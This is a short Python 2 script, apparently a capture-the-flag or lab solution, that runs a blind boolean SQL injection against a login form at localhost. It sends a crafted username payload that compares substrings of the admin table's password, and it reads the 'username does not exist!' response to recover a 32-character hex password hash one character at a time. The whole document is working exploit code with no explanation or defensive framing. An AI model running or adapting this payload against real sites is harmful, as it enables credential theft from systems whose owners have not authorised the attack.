# -*- coding: utf-8 -*-
import requests
url = 'http://localhost/'
def check(payload):
    postdata = {'username':payload,'password':'xx'}
    r = requests.post(url, postdata).content
    return 'username does not exist!' in r

password  = ''
s = r'0123456789abcdef'

for i in xrange(32,0,-1):
    for c in s:
        payload = '\'or(mid((select(password)from(admin))from(%d))<>\'%s\')#' % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print password
